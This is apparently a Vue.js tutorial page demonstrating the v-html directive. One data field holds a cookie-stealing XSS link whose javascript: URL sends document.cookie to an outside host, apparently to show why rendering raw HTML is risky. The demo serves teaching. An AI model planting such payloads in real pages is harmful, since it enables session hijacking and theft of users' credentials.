<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
  <script type="text/javascript" src="../js/vue.js"></script>
</head>
<body>
<div id="root">
  <h3 v-html="name"><p>java</p></h3>
  <h3 v-html="str"></h3>
  <h3 v-html="str2"></h3>
</div>
<script type="text/javascript">
  Vue.config.productionTip = false
  const vm = new Vue({
    el: '#root',
    data: {
      name: 'vue',
      str: '<p>java</p>',
      str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>java</a>'
    }
  })
</script>
</body>
</html>
